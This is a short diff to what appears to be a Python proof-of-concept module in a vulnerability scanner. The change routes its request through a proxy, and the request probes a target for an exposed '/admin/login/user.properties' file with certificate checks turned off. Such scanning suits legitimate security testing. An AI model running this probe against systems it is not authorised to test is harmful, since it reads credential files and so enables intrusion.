@@ -2,6 +2,8 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import headers
 
 requests.packages.urllib3.disable_warnings()
@@ -18,7 +20,7 @@ FOFA_RULE=''
 def poc(target):
     result={}
     try:
-        req = requests.get(target+'/admin/login/user.properties', headers=headers, timeout=3, verify=False)
+        req = requests.get(target+'/admin/login/user.properties', headers=headers, timeout=3, verify=False,proxies=proxies)
         result['target'] = target
         result['poc'] = NAME
         result['status'] = req.status_code
